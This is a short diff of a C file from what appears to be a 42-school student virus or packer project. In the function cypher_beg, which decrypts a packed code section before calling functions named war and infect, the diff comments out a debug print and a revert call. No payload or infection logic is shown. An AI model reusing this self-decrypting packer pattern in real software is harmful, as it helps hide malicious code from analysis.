@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/21 12:58:21 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/22 15:13:18 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -45,10 +45,9 @@ void	cypher_beg(void)
 	t_data	data = {0};
 
 	// DECRYPT TEXT PACKER
-
 	data.context = true;
 	update_one(&data.key, (char*)cypher_beg, (size_t)war - (size_t)cypher_beg);
-	printf("beg key = %lx\n", data.key.one);
-	revert_one(&data.key, (char*)war, (size_t)infect - (size_t)war);
+//	printf("beg key = %lx\n", data.key.one);
+//	revert_one(&data.key, (char*)war, (size_t)infect - (size_t)war);
 	war(&data);
 }
